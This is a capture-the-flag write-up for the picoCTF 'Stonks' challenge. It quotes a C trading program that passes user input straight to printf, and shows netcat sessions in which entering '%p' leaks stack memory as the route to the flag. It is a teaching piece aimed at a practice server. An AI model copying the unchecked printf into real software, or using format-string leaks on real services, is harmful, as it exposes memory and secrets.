# [Stonks](https://play.picoctf.org/practice/challenge/105?bookmarked=1&page=1)

## Initial exploration
After downloading the [C file](https://mercury.picoctf.net/static/a4ce675e8f85190152d66014c9eebd7e/vuln.c), I first tried running the netcat.

```
tiffanygan-picoctf@webshell:/tmp$ nc mercury.picoctf.net 59616
Welcome back to the trading app!

What would you like to do?
1) Buy some stonks!
2) View my portfolio
1
Using patented AI algorithms to buy stonks
Stonks chosen
What is your API token?
test
Buying stonks with token:
test
Portfolio as of Sat Aug 12 17:52:05 UTC 2023


15 shares of CVP
34 shares of X
Goodbye!

tiffanygan-picoctf@webshell:/tmp$ nc mercury.picoctf.net 59616
Welcome back to the trading app!

What would you like to do?
1) Buy some stonks!
2) View my portfolio
2

Portfolio as of Sat Aug 12 17:52:12 UTC 2023


You don't own any stonks!
Goodbye!
```
## Analyzing the C script
Upon opening `vuln.c`, there's a lot of code, so let's take a look at bits of the most important function, `buy_stonks`:

```c
int buy_stonks(Portfolio *p) {
        ...
        
        char api_buf[FLAG_BUFFER];
        FILE *f = fopen("api","r");
        if (!f) {
                printf("Flag file not found. Contact an admin.\n");
                exit(1);
        }
        fgets(api_buf, FLAG_BUFFER, f);

        ...

}
```

The file named `api` is being read, which likely contains our flag. Unfortunately, we don't have access to this on our own devices, so we need to exploit it on the picoCTF server.

```c
int buy_stonks(Portfolio *p) {
        ...
        
        // TODO: Figure out how to read token from file, for now just ask

        char *user_buf = malloc(300 + 1);
        printf("What is your API token?\n");
        scanf("%300s", user_buf);
        printf("Buying stonks with token:\n");
        printf(user_buf);

        // TODO: Actually use key to interact with API

        view_portfolio(p);

        return 0;
}
```

The program's direct usage of `printf(user_buf);` makes it vulnerable to string format attacks. Exploiting this, I input `%p`, which is a format specifier that reveals memory addresses, in order to have the program return the value saved in the memory stack.

```
tiffanygan-picoctf@webshell:/tmp$ nc mercury.picoctf.net 59616
Welcome back to the trading app!

...

What is your API token?
%p
Buying stonks with token:
0x87453f0
Portfolio as of Sat Aug 12 18:02:52 UTC 2023

...

Goodbye!
```

In this case, `0x87453f0` is the value saved in memory. By chaining `%p`s, we can delve deeper into the memory. Once we have the memory content, we can decode it to get our flag.

The code is [here](https://github.com/tiffanygan/picoCTFWriteup/blob/main/src/main/python/stonks.py).